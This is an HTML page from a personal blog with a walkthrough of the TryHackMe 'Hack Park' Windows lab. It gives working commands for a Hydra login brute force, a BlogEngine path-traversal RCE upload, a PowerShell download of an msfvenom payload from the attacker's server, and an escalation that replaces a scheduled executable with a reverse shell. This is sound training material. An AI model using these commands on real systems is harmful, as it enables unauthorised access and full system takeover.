<!doctype html><html lang=en-us dir=ltr><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:title" content="Hack Park"><meta property="og:description" content="Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!"><meta property="og:type" content="article"><meta property="og:url" content="http://localhost:1313/docs/TryHackMe/HackPark/"><meta property="article:section" content="docs"><meta property="article:published_time" content="2023-05-23T00:00:00+00:00"><meta property="article:modified_time" content="2023-05-23T00:00:00+00:00"><title>Hack Park | 乃 | Do or Die</title>
<link rel=manifest href=/manifest.json><link rel=icon href=/favicon.ico><link rel=canonical href=http://localhost:1313/docs/TryHackMe/HackPark/><link rel=stylesheet href=/book.min.95be1f5938e136c9e7f1f54171c546b9f1f6b2a134f0152d9c292974fb0071c6.css integrity="sha256-lb4fWTjhNsnn8fVBccVGufH2sqE08BUtnCkpdPsAccY=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.2047b331ad370472742672fe2a75cfe6449602d60300474387a308f91ad8a561.js integrity="sha256-IEezMa03BHJ0JnL+KnXP5kSWAtYDAEdDh6MI+RrYpWE=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>乃 | Do or Die</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-c72485dffab48e9851d40b64ff5c8557 class=toggle checked>
<label for=section-c72485dffab48e9851d40b64ff5c8557 class="flex justify-between"><a role=button>Try Hack Me</a></label><ul><li><a href=/docs/TryHackMe/Vulnversity/>Vulnversity</a></li><li><a href=/docs/TryHackMe/Blue/>Blue</a></li><li><a href=/docs/TryHackMe/Kenobi/>Kenobi</a></li><li><a href=/docs/TryHackMe/SteelMountain/>Steel Mountain</a></li><li><a href=/docs/TryHackMe/Alfred/>Alfred</a></li><li><a href=/docs/TryHackMe/HackPark/ class=active>Hack Park</a></li><li><a href=/docs/TryHackMe/DailyBugle/>Daily Bugle</a></li></ul></li></ul><ul><li><a href=/posts/>Blog</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu>
</label><strong>Hack Park</strong>
<label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploitation>Exploitation</a></li><li><a href=#privilege-escalation>Privilege Escalation</a><ul><li><a href=#method-1-using-meterpreters-getsystem>Method 1: Using meterpreter&rsquo;s getsystem</a></li><li><a href=#method-2-using-windows-scheduled-task>Method 2: Using Windows Scheduled Task</a></li></ul></li></ul></nav></aside></header><article class="markdown book-article"><p>Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!</p><h1 id=scanning>Scanning
<a class=anchor href=#scanning>#</a></h1><p>Let&rsquo;s begin by scanning the target using RustScan.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>rustscan -a 10.10.120.14 -r 1-65535 --ulimit <span style=color:#ae81ff>5000</span> -- -sVC
</span></span></code></pre></div><h1 id=enumeration>Enumeration
<a class=anchor href=#enumeration>#</a></h1><p>We can see two open ports. Let&rsquo;s see what&rsquo;s running on port 80.</p><p>If we click on the menu icon, we can see the login page.</p><p>We can see that the login page belongs to blogengine.</p><p>Now, we will try to use the default credentials admin:admin to see if that works. But it failed. Now, let&rsquo;s bruteforce the password with the username admin as we know that the default username is admin.</p><p>First, we will fire up Burp Suite to see what type of request the login page is making to the web server. Let&rsquo;s enter admin:admin in the username and password fields and intercept this using Burp Suite.</p><p>We can see that the login page is making a POST request. We will now use Hydra to brute force the password field assuming the username is admin.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.120.14 http-post-form <span style=color:#e6db74>&#34;/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=Pw49CE7XN99O07VsfmUKlS3GQsevl39oxTcHs0fj672xrsEdiwp26MjPpiJLmnJc%2Badroz9oDltpxOKHPbB6cf7nhiuXQBiHwnZYUwx%2BFAGXtU1YQQcxOXrvAntLHand12BsvenypZEkD5DkrYrd6pOBUBnwCzdk6T3Aco66LLlCpW4A&amp;__EVENTVALIDATION=B93mjHyaWPm5JljuEQuMNVayeIlWC4kRbNsrSF9DjvDYBb6ZBhz%2Byag9pTRt8hhBdxWgdwlqd9DiLXamGJERhiMUxR814calYKBvOWaCNKv3zyDSzKVhONt5%2BvmcuOkDTIDPGB6Bpq0Dktu4om3tg%2BjlkZrV4I5NyuuANXrlQgJH71q8&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed&#34;</span> -v
</span></span></code></pre></div><p>It shows that we successfully found the password for the username admin. Now, let&rsquo;s login using the username admin and the password we found.</p><p>We can see a dashboard and when we click on about, we can see the version of the blogengine.</p><p>Now, we will use searchsploit to find any available exploits.</p><p>We can see an exploit for the version 3.3.6. Now, copy that exploit to the current path.</p><p>We can see the description of the exploit and how to use it.</p><h1 id=exploitation>Exploitation
<a class=anchor href=#exploitation>#</a></h1><p>This is a path traversal vulnerability leading to remote code execution which is caused by an unchecked theme parameter that is used to override the default theme for rendering blog pages.</p><p>Change the ip address and port number in the exploit and save it as PostView.ascx.</p><p>Now, navigate to the path that was mentioned in the website.</p><pre tabindex=0><code> http://10.10.120.14/admin/app/editor/editpost.cshtml
</code></pre><p>Click on the file manager icon and then upload the PostView.ascx file.</p><p>Let&rsquo;s start the netcat listener on port 2222.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>nc -lnvp <span style=color:#ae81ff>2222</span>
</span></span></code></pre></div><p>Now we will navigate to the path as show below to trigger the vulnerability.</p><pre tabindex=0><code>http://10.10.120.14/?theme=../../App_Data/files
</code></pre><p>We received a shell in the netcat listener!</p><p>We will elevate out netcat shell to meterpreter shell. We will start this by generating a payload using msfvenom.</p><p>Start metasploit and use exploit multi/handler.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>use multi/handler
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>set lhost tun0
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>set lport <span style=color:#ae81ff>3333</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>exploit
</span></span></code></pre></div><p>Start the python http server using the following command. It serves on port 8000 by default.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>python -m http.server
</span></span></code></pre></div><p>Now, download the payload to the target machine and run it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>powershell -c wget http://10.6.10.164:8000/shell.exe -outfile shell.exe
</span></span></code></pre></div><p>We now got a reverse shell via metasploit!</p><h1 id=privilege-escalation>Privilege Escalation
<a class=anchor href=#privilege-escalation>#</a></h1><h2 id=method-1-using-meterpreters-getsystem>Method 1: Using meterpreter&rsquo;s getsystem
<a class=anchor href=#method-1-using-meterpreters-getsystem>#</a></h2><p>Use the command getsystem to elevate the privileges from local user to root user.</p><h2 id=method-2-using-windows-scheduled-task>Method 2: Using Windows Scheduled Task
<a class=anchor href=#method-2-using-windows-scheduled-task>#</a></h2><p>We already have the meterpreter reverse shell. Let&rsquo;s see what all processes are running.</p><p>We can see that there are a lot of process running. Out of them WScheduler.exe is an interesting process because we can try to elevate our privileges by using the scheduled service. If we navigate to the path of SystemScheduler, there are a lot of processes. And when we navigate to events, we can see the log file 20198415519.INI_LOG.txt.</p><p>When we see the contents inside the log file, there is a specific process Message.exe running as administrator. So, let&rsquo;s try to replace this Message.exe with our malicious exe file with the same name.</p><p>We will generate a payload using msfvenom.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST<span style=color:#f92672>=</span>10.6.10.164 LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>5555</span> -f exe -o Message.exe
</span></span></code></pre></div><p>Now we will background the current meterpreter session.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>bg
</span></span></code></pre></div><p>Now set the port to 5555 and run the exploit in background.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>set lport <span style=color:#ae81ff>5555</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>exploit -j
</span></span></code></pre></div><p>Now, get back to the first meterpreter session.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>sessions -l
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sessions -i <span style=color:#ae81ff>1</span>
</span></span></code></pre></div><p>Navigate to the path C:\Program Files (x86)\SystemScheduler. Now, move the Message.exe file to some other location.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>mv Message.exe C:<span style=color:#ae81ff>\W</span>indows
</span></span></code></pre></div><p>Now upload the malicious file that we just created using msfvenom.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>upload Message.exe
</span></span></code></pre></div><p>Keep the current meterpreter session to backround and check the sessions.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>bg
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sessions -l
</span></span></code></pre></div><p>We can find a new session opened as the user Administrator.</p><p>We now got a reverse shell as root!</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploitation>Exploitation</a></li><li><a href=#privilege-escalation>Privilege Escalation</a><ul><li><a href=#method-1-using-meterpreters-getsystem>Method 1: Using meterpreter&rsquo;s getsystem</a></li><li><a href=#method-2-using-windows-scheduled-task>Method 2: Using Windows Scheduled Task</a></li></ul></li></ul></nav></div></aside></main></body></html>